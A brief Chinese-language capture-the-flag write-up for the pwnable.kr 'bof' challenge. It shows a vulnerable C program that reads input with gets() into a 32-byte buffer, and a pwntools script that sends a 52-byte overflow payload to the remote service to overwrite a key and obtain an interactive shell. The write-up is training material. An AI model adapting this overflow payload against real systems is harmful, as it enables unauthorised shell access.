代码如下

	#include <stdio.h>
	#include <string.h>
	#include <stdlib.h>
	void func(int key){
		char overflowme[32];
		printf("overflow me : ");
		gets(overflowme);	// smash me!
		if(key == 0xcafebabe){
			system("/bin/sh");
		}
		else{
			printf("Nah..\n");
		}
	}
	int main(int argc, char* argv[]){
		func(0xdeadbeef);
		return 0;
	}

代码存在的问题：

	**栈溢出**

在 Kali 中用 edb 调试，可知需要 **52** 字节的才能覆盖到 0xdeadbeef, 攻击代码如下：

	from pwn import *

	ip = 'pwnable.kr'
	port = 9000
	p = '/root/Downloads/bof.local'
	sc = '0000111122223333444455556666777788889999aaaabbbbeeee\xbe\xba\xfe\xca'
	
	#sh = process(p)
	#sh.send(sc)
	#sh.interactive('\nshell# ')
	
	con = remote(ip, port)
	con.send(sc)
	con.recv(timeout=1)
	con.interactive('\nshell# ')


